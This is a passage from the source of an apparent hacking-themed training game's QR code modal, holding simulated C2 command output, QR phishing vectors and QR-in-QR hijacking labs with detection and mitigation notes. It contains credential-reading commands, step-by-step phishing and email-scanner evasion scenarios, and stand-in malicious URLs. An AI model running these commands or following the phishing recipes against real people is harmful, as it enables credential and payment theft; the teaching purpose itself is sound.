      'env | grep -iE "key|token|pass|secret"': 'DATABASE_URL=postgresql://api:SuperS3cret@postgres:5432/payments\nSTRIPE_SECRET_KEY=sk_live_51Hx...\nJWT_SECRET=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\nREDIS_PASSWORD=r3d1s_pr0d_2024',
      'cat ~/.ssh/id_rsa 2>/dev/null || echo "No SSH key"': 'No SSH key\n\nKUBERNETES SERVICE ACCOUNT TOKEN:\n/var/run/secrets/kubernetes.io/serviceaccount/token\neyJhbGciOiJSUzI1NiIsImtpZCI6Ik...[TRUNCATED]',
    }
  },
];

// In-game challenge modes using QR codes
interface QRChallenge {
  id: string;
  name: string;
  icon: string;
  technique: string;
  description: string;
  objective: string;
  realWorldAnalog: string;
}

const QR_CHALLENGE_MODES: QRChallenge[] = [
  {
    id: 'dead_drop',
    name: 'Dead Drop',
    icon: '📍',
    technique: 'Physical QR placement',
    description: 'Leave encoded commands as QR "dead drops" for teammates or your future self to scan.',
    objective: 'Hide QR codes in environment, return later to retrieve encoded intel',
    realWorldAnalog: 'Spies use dead drops to exchange info without meeting. QR codes can contain encrypted coordinates, commands, or keys.'
  },
  {
    id: 'stego_hunter',
    name: 'Stego Hunter',
    icon: '🔬',
    technique: 'LSB Steganography',
    description: 'QR codes hidden in innocent-looking images using least significant bit encoding.',
    objective: 'Analyze images to extract hidden QR codes with secret commands',
    realWorldAnalog: 'Real attackers hide C2 commands in memes, profile pictures, and stock photos posted to social media.'
  },
  {
    id: 'temporal_ghost',
    name: 'Temporal Ghost',
    icon: '👻',
    technique: 'Screen Flicker (TPVM)',
    description: 'QR codes that flash faster than human eyes can see (>60Hz) but cameras detect.',
    objective: 'Point camera at screens to capture "invisible" QR broadcasts',
    realWorldAnalog: 'Used for covert signaling in movie theaters, ATMs, and digital signage. Invisible to guards but phones see it.'
  },
  {
    id: 'hijack_mission',
    name: 'QR Hijacker',
    icon: '🎯',
    technique: 'Li-Man LED Attack',
    description: 'Use light modulation to overlay malicious QR onto legitimate ones.',
    objective: 'Hijack payment/login QR codes to redirect victims',
    realWorldAnalog: 'Researchers hijacked WeChat Pay QRs from 3 meters away using flickering LEDs. Worked through glass.'
  },
  {
    id: 'breadcrumb_trail',
    name: 'Breadcrumb Trail',
    icon: '🥖',
    technique: 'Sequential QR chain',
    description: 'Each QR reveals coordinates to the next. Follow the trail to find the flag.',
    objective: 'Scan QR → get location → find next QR → repeat until victory',
    realWorldAnalog: 'Geocaching meets CTF. Some escape rooms and ARGs use this for immersive storytelling.'
  },
  {
    id: 'qr_inception',
    name: 'QR Inception',
    icon: '🎭',
    technique: 'QR-in-QR Hijacking',
    description: 'Malicious QR hidden inside legitimate one via finder pattern tricks.',
    objective: 'Craft QRs that look innocent but decode to attack payloads',
    realWorldAnalog: 'Attackers modify restaurant menu QRs to phish credentials. The "outer" QR looks normal.'
  },
];

// Educational: Creative QR Ingestion Vectors
// How malicious QR codes reach targets in the real world
interface IngestionVector {
  id: string;
  name: string;
  icon: string;
  category: 'physical' | 'digital' | 'social' | 'supply_chain';
  description: string;
  realExamples: string[];
  labScenario: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced';
}

const QR_INGESTION_VECTORS: IngestionVector[] = [
  // PHYSICAL VECTORS
  {
    id: 'parking_meter',
    name: 'Parking Meter Sticker',
    icon: '🅿️',
    category: 'physical',
    description: 'Malicious QR stickers placed over legitimate payment QRs on parking meters.',
    realExamples: [
      'Austin, TX 2021: Fake QR stickers on 29 parking meters redirected to phishing site',
      'San Antonio: $150K stolen via fake parking payment QRs',
      'UK 2022: Council parking QRs replaced with crypto scam redirects'
    ],
    labScenario: 'Create a QR that mimics a parking payment portal. Victim scans, enters card details on your fake site.',
    difficulty: 'beginner'
  },
  {
    id: 'restaurant_menu',
    name: 'Restaurant Menu Swap',
    icon: '🍽️',
    category: 'physical',
    description: 'Post-COVID menus went digital. Replace table QRs with credential harvesters.',
    realExamples: [
      'QR menus often link to third-party ordering systems with payment integration',
      'Table tent QRs easily swapped by "customer" planting malicious ones',
      'Some restaurants use same QR for WiFi login + menu (credential goldmine)'
    ],
    labScenario: 'Craft QR linking to fake menu that requests "login to view allergen info" then harvests credentials.',
    difficulty: 'beginner'
  },
  {
    id: 'package_insert',
    name: 'Package Insert Attack',
    icon: '📦',
    category: 'supply_chain',
    description: 'Malicious QR codes inserted into product packaging or shipping materials.',
    realExamples: [
      'Amazon brushing scams include QRs linking to fake review sites that steal accounts',
      'Counterfeit products include "warranty registration" QRs that phish',
      'Electronics from gray market include "driver download" QRs with malware'
    ],
    labScenario: 'Design a "warranty registration" QR insert. Victim scans to register product, gives up personal data.',
    difficulty: 'intermediate'
  },
  {
    id: 'business_card',
    name: 'Evil Business Card',
    icon: '💼',
    category: 'social',
    description: 'Business cards with QR codes linking to vCard downloads that contain malicious payloads.',
    realExamples: [
      'vCard files can contain JavaScript in some parsers',
      'QR business cards at conferences - victims import contacts from strangers',
      'LinkedIn profile QRs spoofed to credential harvesting pages'
    ],
    labScenario: 'Create business card QR that downloads vCard with embedded tracking pixel or redirect.',
    difficulty: 'intermediate'
  },
  {
    id: 'public_wifi',
    name: 'Fake WiFi Portal',
    icon: '📶',
    category: 'physical',
    description: 'QR codes in cafes/airports that connect to evil twin networks or captive portal phishing.',
    realExamples: [
      'Coffee shop "Free WiFi" QR connects to attacker hotspot',
      'Airport lounge QRs replaced with credential-harvesting captive portals',
      'Hotel room QRs swapped to intercept business traveler traffic'
    ],
    labScenario: 'Create QR that configures WiFi to connect to your network, then present fake login portal.',
    difficulty: 'advanced'
  },
  // DIGITAL VECTORS
  {
    id: 'email_qr',
    name: 'Email QR Phishing',
    icon: '📧',
    category: 'digital',
    description: 'QR codes embedded in emails bypass URL scanning since the URL is encoded in an image.',
    realExamples: [
      'Microsoft 365 phishing: "Scan to verify your account" bypasses Defender',
      'HR emails with "scan for benefits enrollment" targeting employees',
      'IT department spoofs: "Scan to update password" campaigns'
    ],
    labScenario: 'Embed QR in email body. Security tools see image, not URL. Victim scans with phone (outside corporate network).',
    difficulty: 'beginner'
  },
  {
    id: 'document_qr',
    name: 'PDF/Document QR',
    icon: '📄',
    category: 'digital',
    description: 'QR codes in PDFs, invoices, or official-looking documents.',
    realExamples: [
      'Fake invoices with "pay here" QR codes sent to accounts payable',
      'Government form spoofs with QR leading to phishing portals',
      'Legal documents with "e-signature required" QR redirects'
    ],
    labScenario: 'Create fake invoice PDF with QR for "instant payment". Looks legitimate, steals banking credentials.',
    difficulty: 'intermediate'
  },
  {
    id: 'social_media',
    name: 'Social Media QR',
    icon: '📱',
    category: 'digital',
    description: 'QR codes shared in posts, stories, or profile pictures.',
    realExamples: [
      'Instagram bio QRs linking to crypto scams',
      'TikTok "scan for free followers" campaigns',
      'Discord server QRs that hijack sessions (QRLJacking)'
    ],
    labScenario: 'Post QR as "exclusive content link". When scanned, performs session hijacking via OWASP QRLJacking technique.',
    difficulty: 'advanced'
  },
  {
    id: 'gaming_overlay',
    name: 'In-Game QR Drop',
    icon: '🎮',
    category: 'digital',
    description: 'QR codes placed in game environments or streams.',
    realExamples: [
      'Twitch stream overlays with "sub for discount" QRs',
      'In-game billboards in open worlds (GTA, Minecraft servers)',
      'Esports event screens with sponsor QRs swapped'
    ],
    labScenario: 'Place QR in game screenshot/video that appears to be in-game content but links to phishing site.',
    difficulty: 'intermediate'
  },
  // SUPPLY CHAIN
  {
    id: 'firmware_update',
    name: 'Firmware Update QR',
    icon: '🔧',
    category: 'supply_chain',
    description: 'IoT devices with QR codes for "easy setup" that download malicious firmware.',
    realExamples: [
      'Smart home devices with setup QRs linking to modified apps',
      'Security cameras with "latest firmware" QR leading to backdoored updates',
      'Router setup QRs in hotel rooms modified by previous guests'
    ],
    labScenario: 'Create device manual with QR for "driver installation". Links to executable that establishes reverse shell.',
    difficulty: 'advanced'
  },
  {
    id: 'ev_charging',
    name: 'EV Charging Station',
    icon: '⚡',
    category: 'physical',
    description: 'Electric vehicle charging stations with payment QR codes.',
    realExamples: [
      'UK 2022: Fake QR stickers on ChargePoint stations stole payment info',
      'Tesla Supercharger QRs spoofed for "discount charging"',
      'Public charging apps requested via QR that are actually spyware'
    ],
    labScenario: 'Design fake charging payment QR. Victim scans, enters payment info on convincing clone site.',
    difficulty: 'beginner'
  },
  // SOCIAL ENGINEERING
  {
    id: 'charity_scam',
    name: 'Charity/Disaster QR',
    icon: '❤️',
    category: 'social',
    description: 'Fake charity QR codes exploiting disasters or causes.',
    realExamples: [
      'Ukraine war donation scam QRs spread on social media',
      'COVID relief fund QRs that stole donations',
      'Natural disaster "text to donate" equivalents via QR'
    ],
    labScenario: 'Create urgent charity appeal with QR. Victim donates, money goes to attacker wallet.',
    difficulty: 'beginner'
  },
  {
    id: 'physical_mail',
    name: 'Physical Mail QR',
    icon: '✉️',
    category: 'physical',
    description: 'QR codes in postal mail that appears to be from banks, utilities, or government.',
    realExamples: [
      'Germany 2022: Fake bank letters with "verify account" QRs',
      'IRS/HMRC spoof letters with "check refund status" QRs',
      'Utility bill QRs replaced in mailboxes'
    ],
    labScenario: 'Design official-looking letter from bank with QR to "verify identity". Harvests full PII.',
    difficulty: 'intermediate'
  },
];

// QR-in-QR Hijacking Labs - Hands-on exercises
interface QRLabExercise {
  id: string;
  title: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  concept: string;
  realWorldCase: string;
  objective: string;
  steps: string[];
  detection: string;
  mitigation: string;
}

const QR_INCEPTION_LABS: QRLabExercise[] = [
  {
    id: 'lab_finder_confusion',
    title: 'Lab 1: Finder Pattern Confusion',
    difficulty: 'beginner',
    concept: 'QR scanners identify codes by finding three corner squares (finder patterns). Multiple competing finder patterns confuse detection.',
    realWorldCase: 'Tsinghua University 2022: Researchers created QRs where WeChat decoded URL-A while Alipay decoded URL-B from the same image.',
    objective: 'Understand how finder patterns work and why different scanners may read different data.',
    steps: [
      'Generate a legitimate QR code for "https://safe-site.com"',
      'Overlay a second QR code with modified finder patterns',
      'The modified patterns are sized to be detected only by certain scanners',
      'Test with multiple scanning apps - observe different results'
    ],
    detection: 'Look for unusual visual artifacts, multiple sets of corner squares, or asymmetric patterns.',
    mitigation: 'Use multiple scanning apps. If results differ, the QR is suspicious.'
  },
  {
    id: 'lab_quiet_zone',
    title: 'Lab 2: Hidden Quiet Zone Attack',
    difficulty: 'intermediate',
    concept: 'QR codes require white "quiet zones" around them. Hiding these zones embeds a second code within the first.',
    realWorldCase: 'Researchers hid malicious URLs in the data area of legitimate QRs by eliminating the inner code\'s quiet zone.',
    objective: 'Learn how quiet zones enable nested QR attacks.',
    steps: [
      'Create outer QR: legitimate restaurant menu URL',
      'Create inner QR: credential harvesting URL',
      'Remove inner QR quiet zones so it blends into outer QR data area',
      'Result: Some scanners read outer (safe), others read inner (malicious)'
    ],
    detection: 'Zoom in on QR codes. Look for patterns-within-patterns or unusual data density areas.',
    mitigation: 'Never scan QRs from untrusted sources. Verify URL before clicking.'
  },
  {
    id: 'lab_physical_overlay',
    title: 'Lab 3: Physical Sticker Attack',
    difficulty: 'beginner',
    concept: 'Simply placing a malicious QR sticker over a legitimate one. Low-tech but highly effective.',
    realWorldCase: 'Austin TX 2021: Criminals placed fake parking meter QR stickers. Victims entered payment info on phishing site. $150K+ stolen.',
    objective: 'Demonstrate how physical access enables trivial QR hijacking.',
    steps: [
      'Photograph a legitimate payment QR (parking meter, menu, etc.)',
      'Generate malicious QR matching the size and position',
      'Print on adhesive paper',
      'Apply over legitimate QR (simulation only!)',
      'Victim scans your QR instead of the real one'
    ],
    detection: 'Check if QR is a sticker vs. printed/etched. Look for peeling edges or layered paper.',
    mitigation: 'Businesses should use tamper-evident QR displays or etched codes.'
  },
  {
    id: 'lab_barcode_inception',
    title: 'Lab 4: Barcode-in-QR Inception',
    difficulty: 'advanced',
    concept: 'Embed a Data Matrix or Aztec code inside a QR code. Different scanner libraries prioritize different formats.',
    realWorldCase: 'Academic research (Dabrowski 2014): Demonstrated cross-format attacks where QR readers found QR, but Data Matrix readers found hidden payload.',
    objective: 'Exploit format ambiguity between barcode types.',
    steps: [
      'Generate QR code with benign URL',
      'Generate Data Matrix with malicious payload',
      'Carefully merge: Data Matrix finder patterns placed in QR data regions',
      'Test with QR-only apps vs. universal barcode scanners',
      'Universal scanners may decode the hidden Data Matrix first'
    ],
    detection: 'Use a QR-only scanner app. If universal scanner shows different result, investigate.',
    mitigation: 'Standardize on single barcode format. Train users to recognize format differences.'
  },
  {
    id: 'lab_split_qr',
    title: 'Lab 5: Split QR Email Attack',
    difficulty: 'intermediate',
    concept: 'Split a QR code into multiple images that only form a complete code when viewed together.',
    realWorldCase: 'Barracuda 2024: Phishing emails contained split QR codes. Security scanners analyzed individual images (benign), but visual assembly created malicious code.',
    objective: 'Bypass email security by fragmenting the QR code.',
    steps: [
      'Generate malicious QR code (phishing URL)',
      'Split into 2-4 image fragments',
      'Embed fragments in email as separate images positioned adjacent',
      'Email security scans each image individually - finds nothing',
      'Human eye (and phone camera) sees complete QR code'
    ],
    detection: 'Be suspicious of QR codes made of multiple image files or unusual email layouts.',
    mitigation: 'Advanced email security should perform visual rendering before scanning.'
  },
  {
    id: 'lab_pdf_draw',
    title: 'Lab 6: Programmatic PDF QR',
    difficulty: 'advanced',
    concept: 'Draw QR modules directly using PDF content-stream commands instead of embedding an image.',
    realWorldCase: 'Unit42 2024: Attackers issued PDF drawing commands to create QR codes. No image file to detect, bypasses image-based scanners.',
    objective: 'Evade image-extraction security by generating QR via vector graphics.',
    steps: [
      'Create PDF with content stream drawing commands',
      'Each QR module is a precise rectangle command',
      'No embedded image - just vector shapes',
      'Image extraction tools find nothing',
      'Visual rendering shows complete scannable QR'
    ],
    detection: 'Render PDFs and visually inspect. Don\'t rely solely on automated image extraction.',
    mitigation: 'Use PDF security that renders and scans visual output, not just embedded objects.'
  },
];

// QR Action Templates - Mirror real security tools with game intents
// These match real-world CTF/OSINT patterns for authenticity
const QR_ACTION_PRESETS = [
  { 
    id: 'custom', 
    name: 'Raw Payload', 
    template: '{"type":"raw","data":"BASE64_OR_HEX_DATA","encoding":"base64"}',
    description: 'Raw data injection - mirrors real QR malware payloads'
  },
  { 
    id: 'beacon', 
    name: 'C2 Beacon', 
    template: '{"type":"beacon","callback":"https://c2.sysadmin.corp/check-in","agent_id":"AGENT-001","interval":60}',
    description: 'Command & Control check-in - like real APT beacons'
  },
  { 
    id: 'exfil', 
    name: 'Data Exfiltration', 
    template: '{"type":"exfil","target":"session","fields":["token","clues","username"],"dest":"/api/collect"}',
    description: 'Exfil player data - mirrors real data theft techniques'
  },
  { 
    id: 'inject', 
    name: 'Code Injection', 
    template: '{"type":"inject","payload":"echo $FLAG","shell":"bash","sandbox":true}',
    description: 'Inject terminal command - like real RCE exploits'
  },
  { 
    id: 'phish', 
    name: 'Credential Harvest', 
    template: '{"type":"phish","redirect":"/admin","spoof":"login","capture":["username","password"]}',
    description: 'Redirect to fake login - mirrors real phishing'
  },
  { 
    id: 'dropper', 
    name: 'Payload Dropper', 
    template: '{"type":"dropper","artifact":{"id":"clue-05","name":"Malware Sample","content":"ZXhwbG9pdC5leGU="},"autorun":false}',
    description: 'Drop artifact/clue - like malware droppers'
  },
  { 
    id: 'pivot', 
    name: 'Network Pivot', 
    template: '{"type":"pivot","from":"/terminal","to":"/void","tunnel":"ssh","port":22}',
    description: 'Redirect through routes - mirrors network pivoting'
  },
  { 
    id: 'recon', 
    name: 'Reconnaissance', 
    template: '{"type":"recon","scan":"full","targets":["routes","clues","quests"],"output":"json"}',
    description: 'Enumerate game state - like nmap/recon scans'
  },
  { 
    id: 'persistence', 
    name: 'Persistence Mechanism', 
    template: '{"type":"persist","method":"localstorage","key":"backdoor","value":"ACTIVE","ttl":86400}',
    description: 'Install persistent access - mirrors real persistence'
  },
  { 
    id: 'decrypt', 
    name: 'Crypto Challenge', 
    template: '{"type":"crypto","cipher":"rot13","data":"FRPERG_ZRFFNTR","hint":"Classic cipher"}',
    description: 'Encrypted message - requires decryption to unlock'
  },
];

interface QRCodeModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

export const QRCodeModal = ({ open, onOpenChange }: QRCodeModalProps) => {
  const { gameState, collectClue, importSession, awardXP, incrementStat } = useGame();
  const [code, setCode] = useState(QR_ACTION_PRESETS[0].template);
  const [selectedPreset, setSelectedPreset] = useState('custom');
  const [qrImage, setQrImage] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [importCode, setImportCode] = useState('');
  const [importResult, setImportResult] = useState<string | null>(null);
  const [agentResult, setAgentResult] = useState<string | null>(null);
  const [sessionInput, setSessionInput] = useState('');
  const [sessionStatus, setSessionStatus] = useState<'idle' | 'success' | 'error'>('idle');
  const [sessionMessage, setSessionMessage] = useState('');
  const [c2Command, setC2Command] = useState('whoami');
  const [c2CommandQR, setC2CommandQR] = useState<string | null>(null);
  const [c2Results, setC2Results] = useState<Array<{ id: number; command: string; result: string; timestamp: string }>>([]);
  const [c2CommandIndex, setC2CommandIndex] = useState(0);
  const [c2SelectedTemplate, setC2SelectedTemplate] = useState('shell');
  const [c2ServerStatus, setC2ServerStatus] = useState<'offline' | 'online' | 'waiting'>('offline');
  const [c2Section, setC2Section] = useState<'encode' | 'missions' | 'vectors' | 'labs'>('missions');
  const [selectedVector, setSelectedVector] = useState<string | null>(null);
  const [selectedLab, setSelectedLab] = useState<string | null>(null);
  const [activeLabId, setActiveLabId] = useState<string | null>(null);
  const [labStep, setLabStep] = useState(0);
  const [labCompleted, setLabCompleted] = useState<Set<string>>(new Set());
  const [labQrResults, setLabQrResults] = useState<Record<string, string>>({});
  const [labScanResults, setLabScanResults] = useState<Array<{scanner: string; result: string; isMalicious: boolean}>>([]);
  const [labSimulating, setLabSimulating] = useState(false);
  const [selectedTarget, setSelectedTarget] = useState('linux_server');
  const [activeMission, setActiveMission] = useState<string | null>(null);
  const [missionStep, setMissionStep] = useState(0);
  const [missionCompleted, setMissionCompleted] = useState<Set<string>>(new Set());
  const [selectedFlow, setSelectedFlow] = useState<string | null>(null);
  const [missionQR, setMissionQR] = useState<string | null>(null);

  const generateQR = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/qr/secret', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          secretId: `custom-${Date.now()}`, 
          hint: code 
        })
      });
      const data = await response.json();
      setQrImage(data.qrCode);
    } catch (error) {
      console.error('Failed to generate QR:', error);
    }
    setLoading(false);
  };

  const exportSession = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/qr/export', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionToken: gameState.sessionToken })
      });
      const data = await response.json();
      setQrImage(data.qrCode);
      setCode(JSON.stringify({
        type: 'session',
        clues: gameState.inventory.length,
        token: gameState.sessionToken.substring(0, 8) + '...'
      }, null, 2));
    } catch (error) {
      console.error('Failed to export session:', error);
    }
    setLoading(false);
  };

  const handleImport = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/qr/decode', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ encoded: importCode })
      });
      const data = await response.json();
      
      if (data.type === 'secret') {
        const secretData = JSON.parse(data.data);
        collectClue({
          id: `qr-${secretData.id}`,
          name: 'QR Fragment',
          description: 'Decoded from a QR signal.',
          content: secretData.hint,
          foundAt: new Date().toISOString()
        });
        setImportResult('SUCCESS: Data fragment extracted and archived.');
      } else if (data.type === 'session') {
        setImportResult('SESSION DATA DETECTED. Merge not implemented in this interface.');
      } else {
        setImportResult(`DECODED: ${JSON.stringify(data)}`);
      }
    } catch (error) {
      setImportResult('ERROR: Invalid or corrupted QR payload.');
    }
    setLoading(false);
  };

  const downloadQR = () => {
    if (!qrImage) return;
    const link = document.createElement('a');
    link.href = qrImage;
    link.download = `qr-${Date.now()}.png`;
    link.click();
  };

  const copyToClipboard = () => {
    if (qrImage) {
      navigator.clipboard.writeText(qrImage);
    }
  };

  const executeViaAgent = async () => {
    setLoading(true);
    setAgentResult(null);
    try {
      const response = await fetch('/api/agent/execute', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          payload: code,
          sessionToken: gameState.sessionToken,
          agentId: 'QR-MODAL-AGENT'
        })
      });
      const data = await response.json();
      setAgentResult(JSON.stringify(data, null, 2));
    } catch (error) {
      setAgentResult('ERROR: Agent execution failed - ' + String(error));
    }
    setLoading(false);
  };

  const copyPayloadForAgent = () => {
    const agentPayload = JSON.stringify({
      endpoint: '/api/agent/execute',
      method: 'POST',
      body: {
        payload: JSON.parse(code),
        sessionToken: 'SESSION_TOKEN_HERE',
        agentId: 'YOUR_AGENT_ID'
      }
    }, null, 2);
    navigator.clipboard.writeText(agentPayload);
  };

  const copySessionToken = () => {
    navigator.clipboard.writeText(gameState.sessionToken);
    setSessionStatus('success');
    setSessionMessage('Token copied to clipboard!');
    setTimeout(() => setSessionStatus('idle'), 2000);
  };

  const handleImportSession = async () => {
    if (!sessionInput.trim()) {
      setSessionStatus('error');
      setSessionMessage('Please enter a session token');
      return;
    }
    
    setLoading(true);
    try {
      const success = await importSession(sessionInput.trim());
      if (success) {
        setSessionStatus('success');
        setSessionMessage('Session imported successfully! Refreshing...');
        setTimeout(() => {
          window.location.reload();
        }, 1500);
      } else {
        setSessionStatus('error');
        setSessionMessage('Invalid session token or session not found');
      }
    } catch (error) {
      setSessionStatus('error');
      setSessionMessage('Failed to import session: ' + String(error));
    }
    setLoading(false);
  };

  const generateC2CommandQR = async () => {
    setLoading(true);
    try {
      const c2Payload = {
        type: 'c2_command',
        id: c2CommandIndex,
        cmd: c2Command,
        encoding: 'base64',
        timestamp: new Date().toISOString()
      };
      const response = await fetch('/api/qr/secret', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          secretId: `c2-cmd-${c2CommandIndex}`, 
          hint: JSON.stringify(c2Payload)
        })
      });
      const data = await response.json();
      setC2CommandQR(data.qrCode);
      setC2CommandIndex(prev => prev + 1);
      setC2ServerStatus('waiting');
    } catch (error) {
      console.error('Failed to generate C2 command QR:', error);
    }
    setLoading(false);
  };

  const completeMission = async (missionId: string) => {
    const mission = C2_GUIDED_MISSIONS.find(m => m.id === missionId);
    if (!mission || missionCompleted.has(missionId)) return;
    
    setMissionCompleted(prev => new Set([...Array.from(prev), missionId]));
    
    try {
      await awardXP(mission.xpReward, `Completed C2 Mission: ${mission.name}`);
      
      collectClue({
        id: `c2-mission-${missionId}`,
        name: `C2 Intel: ${mission.name}`,
        description: `Completed the "${mission.name}" C2 training mission. Category: ${mission.category}. ${mission.realWorldCase.substring(0, 100)}...`,
        content: JSON.stringify({
          mission: missionId,
          category: mission.category,
          difficulty: mission.difficulty,
          campaignTags: mission.campaignTags,
          completedAt: new Date().toISOString(),
        }),
        foundAt: new Date().toISOString(),
      });
      
      incrementStat('missionsCompleted');
    } catch (e) {
      console.error('Mission reward error:', e);
    }
  };

  const startMissionStep = (missionId: string, stepIdx: number) => {
    const mission = C2_GUIDED_MISSIONS.find(m => m.id === missionId);
    if (!mission || stepIdx >= mission.steps.length) return;
    
    const step = mission.steps[stepIdx];
    setC2Command(step.command);
    setSelectedTarget('linux_server');
  };

  const simulateC2Result = () => {
    const target = TARGET_MACHINES.find(t => t.id === selectedTarget) || TARGET_MACHINES[0];
    
    let result = target.responses[c2Command];
    
    if (!result) {
      const partialMatch = Object.keys(target.responses).find(cmd => 
        c2Command.includes(cmd.split(' ')[0]) || cmd.includes(c2Command.split(' ')[0])
      );
      if (partialMatch) {
        result = target.responses[partialMatch];
      }
    }
    
    if (!result) {
      const genericResponses: Record<string, string[]> = {
        linux_server: [
          `${c2Command}: command executed\nwww-data@prod-web-01:~$ [no output]`,
          `bash: ${c2Command}: command not found`,
          `Permission denied: ${c2Command}`,
        ],
        windows_workstation: [
          `'${c2Command}' is not recognized as an internal or external command`,
          `Access is denied.`,
          `The term '${c2Command}' is not recognized as the name of a cmdlet`,
        ],
        iot_camera: [
          `${c2Command}: applet not found`,
          `-sh: ${c2Command}: not found`,
          `BusyBox v1.30.1 - ${c2Command} executed`,
        ],
        docker_container: [
          `OCI runtime exec failed: ${c2Command}`,
          `node@api-payments:~$ ${c2Command}\n[no output - process exited 0]`,
          `Error: ENOENT: no such file or directory`,
        ],
      };
      const responses = genericResponses[target.id] || genericResponses.linux_server;
      result = responses[Math.floor(Math.random() * responses.length)];
    }
    
    setC2Results(prev => [...prev, {
      id: c2CommandIndex,
      command: c2Command,
      result,
      timestamp: new Date().toISOString()
    }]);
    setC2CommandIndex(prev => prev + 1);
    setC2ServerStatus('online');
    
    setTimeout(() => setC2ServerStatus('offline'), 3000);
  };

  const LAB_SIMULATIONS: Record<string, { safeUrl: string; maliciousUrl: string; scanners: Array<{name: string; readsOuter: boolean}> }> = {
    lab_finder_confusion: {
      safeUrl: 'https://safe-restaurant.com/menu',
      maliciousUrl: 'https://evil-site.xyz/harvest',
      scanners: [
        { name: 'iOS Camera', readsOuter: true },
        { name: 'Google Lens', readsOuter: true },
        { name: 'WeChat Scanner', readsOuter: false },
        { name: 'Alipay Scanner', readsOuter: false },
        { name: 'ZXing Library', readsOuter: true },
      ]
    },
    lab_quiet_zone: {
      safeUrl: 'https://legit-menu.restaurant/order',
      maliciousUrl: 'https://credential-harvester.evil/login',
      scanners: [
        { name: 'iPhone Camera', readsOuter: true },
        { name: 'Android Camera', readsOuter: true },
        { name: 'QR Droid Pro', readsOuter: false },
        { name: 'Kaspersky QR', readsOuter: true },
      ]
    },
    lab_physical_overlay: {
      safeUrl: 'https://city-parking.gov/pay',
      maliciousUrl: 'https://park-payment.scam/checkout',
      scanners: [
        { name: 'Any Scanner', readsOuter: false },
      ]
    },
    lab_barcode_inception: {
      safeUrl: 'https://product-info.com/details',
      maliciousUrl: 'data:text/html,<script>document.cookie</script>',
      scanners: [
        { name: 'QR-Only Scanner', readsOuter: true },
        { name: 'Universal Barcode App', readsOuter: false },
        { name: 'Retail POS Scanner', readsOuter: false },
        { name: 'NeoReader', readsOuter: false },
      ]
    },
    lab_split_qr: {
      safeUrl: '[Fragment 1: no valid QR]',
      maliciousUrl: 'https://phish-corp.evil/o365-login',
      scanners: [
        { name: 'Email Security (per-image)', readsOuter: true },
        { name: 'Phone Camera (visual)', readsOuter: false },
        { name: 'Proofpoint Scanner', readsOuter: true },
      ]
    },
    lab_pdf_draw: {
      safeUrl: '[No embedded images found]',
      maliciousUrl: 'https://fake-invoice.evil/pay?ref=INV-2024',
      scanners: [
        { name: 'Image Extraction Tool', readsOuter: true },
        { name: 'Visual PDF Renderer', readsOuter: false },
        { name: 'Adobe Scan (phone)', readsOuter: false },
      ]
    },
  };

  const startLab = (labId: string) => {
    setActiveLabId(labId);
    setLabStep(0);
    setLabScanResults([]);
    setLabQrResults({});
    setLabSimulating(false);
  };

  const simulateLabScan = async (labId: string) => {
    setLabSimulating(true);
    setLabScanResults([]);
    const sim = LAB_SIMULATIONS[labId];
    if (!sim) { setLabSimulating(false); return; }

    for (let i = 0; i < sim.scanners.length; i++) {
      await new Promise(r => setTimeout(r, 600 + Math.random() * 400));
      const scanner = sim.scanners[i];
      setLabScanResults(prev => [...prev, {
        scanner: scanner.name,
        result: scanner.readsOuter ? sim.safeUrl : sim.maliciousUrl,
        isMalicious: !scanner.readsOuter,
      }]);
    }
    setLabSimulating(false);
  };

  const generateLabQR = async (labId: string, url: string, label: string) => {
    try {
      const response = await fetch('/api/qr/secret', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ secretId: `lab-${labId}-${label}`, hint: url })
      });
      const data = await response.json();
      setLabQrResults(prev => ({ ...prev, [label]: data.qrCode }));
    } catch (error) {
      console.error('Lab QR generation failed:', error);
    }
  };

  const completeLab = async (labId: string) => {
    if (labCompleted.has(labId)) return;
    const lab = QR_INCEPTION_LABS.find(l => l.id === labId);
    if (!lab) return;

    setLabCompleted(prev => new Set([...Array.from(prev), labId]));

    const xpReward = lab.difficulty === 'beginner' ? 40 : lab.difficulty === 'intermediate' ? 65 : 100;
    try {
      await awardXP(xpReward, `Completed QR Lab: ${lab.title}`);
      collectClue({
        id: `qr-lab-${labId}`,
        text: `${lab.title}: ${lab.concept}`,
        foundAt: 'QR Inception Labs',
        timestamp: Date.now(),
      });
      incrementStat('cluesFound');
    } catch (e) {
      console.error('Lab reward error:', e);
    }

    setActiveLabId(null);
    setLabStep(0);
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="bg-[#0a0500] border-amber-900/50 text-stone-300 font-mono max-w-2xl max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle className="text-amber-600 font-orbitron flex items-center gap-2">
            <QrCode className="w-5 h-5" />
            QR SIGNAL GENERATOR
          </DialogTitle>
          <DialogDescription className="text-stone-500">
            Encode or decode data fragments via QR transmission.
          </DialogDescription>
        </DialogHeader>

        <Tabs defaultValue="generate" className="w-full">
          <TabsList className="bg-amber-950/30 border border-amber-900/30 flex-wrap h-auto">
            <TabsTrigger value="session" className="data-[state=active]:bg-teal-900/50 data-[state=active]:text-teal-400">
              <Key className="w-3 h-3 mr-1" /> Session
            </TabsTrigger>
            <TabsTrigger value="generate" className="data-[state=active]:bg-amber-900/50 data-[state=active]:text-amber-400">
              Generate
            </TabsTrigger>
            <TabsTrigger value="export" className="data-[state=active]:bg-amber-900/50 data-[state=active]:text-amber-400">
              Export
            </TabsTrigger>
            <TabsTrigger value="agent" className="data-[state=active]:bg-amber-900/50 data-[state=active]:text-amber-400">
